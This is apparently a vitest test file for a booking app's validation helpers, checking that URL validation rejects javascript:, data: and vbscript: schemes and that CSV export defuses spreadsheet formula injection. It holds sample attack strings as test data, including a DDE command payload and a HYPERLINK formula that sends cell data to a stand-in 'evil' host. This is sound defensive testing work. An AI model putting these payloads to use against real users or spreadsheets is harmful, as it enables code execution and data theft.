import { describe, expect, it } from "vitest";
import { csvCell, httpUrl, toCsv } from "../validation";

// React escapes everything it renders and the codebase contains no
// dangerouslySetInnerHTML / innerHTML / eval, so stored "<script>" values are
// inert on screen. These tests cover the two sinks that escaping does NOT
// protect: URLs that become href/src, and cells a spreadsheet evaluates.

describe("httpUrl", () => {
  it("rejects script-bearing URI schemes that z.string().url() allows", () => {
    // Each of these is accepted by a bare z.string().url(); if one reached an
    // href or a plain <img src>, it would execute.
    for (const attack of [
      "javascript:alert(1)",
      "JavaScript:alert(1)",
      "  javascript:alert(1)",
      "data:text/html,<script>alert(1)</script>",
      "vbscript:msgbox(1)",
    ]) {
      expect(httpUrl.safeParse(attack).success, `accepted ${attack}`).toBe(
        false,
      );
    }
  });

  it("accepts ordinary http and https image URLs", () => {
    for (const ok of [
      "https://images.example.com/a.jpg",
      "http://example.com/photo.png",
      "https://example.com/p.jpg?w=800&q=80",
    ]) {
      expect(httpUrl.safeParse(ok).success, `rejected ${ok}`).toBe(true);
    }
  });

  it("still rejects values that are not URLs at all", () => {
    expect(httpUrl.safeParse("not a url").success).toBe(false);
    expect(httpUrl.safeParse("").success).toBe(false);
  });
});

describe("csvCell", () => {
  it("defuses spreadsheet formula injection", () => {
    // A client can set their own name via the public booking form, so these
    // are attacker-controlled and land in the admin's CSV export.
    for (const attack of [
      "=cmd|'/c calc'!A1",
      '=HYPERLINK("http://evil/?d="&A1,"Click")',
      "+1+1",
      "-1+1",
      "@SUM(1+1)",
    ]) {
      const cell = csvCell(attack);
      expect(cell.startsWith("\"'"), `not neutralised: ${attack}`).toBe(true);
    }
  });

  it("leaves ordinary values untouched apart from quoting", () => {
    expect(csvCell("Anita Rao")).toBe('"Anita Rao"');
    expect(csvCell("anita@example.com")).toBe('"anita@example.com"');
    expect(csvCell(50)).toBe('"50"');
    // A leading '+' on a phone number is a formula trigger, so it is escaped —
    // the apostrophe is not displayed by the spreadsheet.
    expect(csvCell("+919812345678")).toBe("\"'+919812345678\"");
  });

  it("escapes embedded quotes so a value cannot break out of its cell", () => {
    expect(csvCell('He said "hi"')).toBe('"He said ""hi"""');
  });

  it("renders null/undefined as an empty cell", () => {
    expect(csvCell(null)).toBe('""');
    expect(csvCell(undefined)).toBe('""');
  });
});

describe("toCsv", () => {
  it("joins rows with every cell individually protected", () => {
    const csv = toCsv([
      ["Name", "Email"],
      ["=cmd|'/c calc'!A1", "a@b.com"],
    ]);
    expect(csv).toBe('"Name","Email"\n"\'=cmd|\'/c calc\'!A1","a@b.com"');
  });
});
